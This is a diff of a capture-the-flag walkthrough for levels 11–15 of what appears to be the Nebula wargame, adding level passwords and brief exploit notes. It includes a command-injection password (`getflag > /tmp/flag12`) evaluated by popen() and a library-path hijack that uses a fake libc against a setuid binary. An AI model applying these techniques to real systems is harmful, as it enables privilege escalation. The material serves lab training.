@@ -128,7 +128,7 @@ python gen.py | TEMP=/tmp /home/flag11/flag11
 cat /home/flag11/out
 You have successfully executed getflag on a target account
 
-next level pass:
+next level pass: 4RmWT7Dz
 
 Level12:
 ----------------
@@ -136,7 +136,7 @@ telnet 127.0.0.1 50001
 Password: `getflag > /tmp/flag12` 
 Command passed as password gets evaluated by popen()
 
-next level pass: 
+next level pass: 6yXhk4cu
 
 Level13:
 ----------------
@@ -162,7 +162,7 @@ Continuing.
 Your token is b705702b-76a8-42b0-8844-3adabbe5ac58
 [Inferior 1 (process 2114) exited with code 063]
 
-next level pass: 
+next level pass: 3JNcCWvD
 
 Level14:
 ----------------
@@ -171,10 +171,35 @@ $./flag14 -e
 Simple encrytion with incrementing key. 
 abc -> ace and so on ...
 'Decrypt' with dec.py:
+$cd ~
 $python dec.py `cat /home/flag14/token`
 8457c118-887c-4e40-a5a6-33a25353165
 
-next level pass: 
+next level pass: NeZMmlui
 
 Level15:
+----------------
+./strace /home/flag15/flag15
+http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html
+
+[...]
+open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+[...]
+Create a fake library in the path above, where the program searches for libraries,
+
+Function used:
+gdb /home/flag15/flag15
+(gdb) disas main
+. . .
+0x08048340 <+16>:    call   0x8048300 <puts@plt>
+. . .
+
+To get access to system()  function, link in libc’s static library (-Bstatic, -static).
+
+$ make -f Makefile all
+$ strace /home/flag15/flag15 2> out_strace
+
+next level pass: 574YGIzG
+
+Level16:
 ----------------
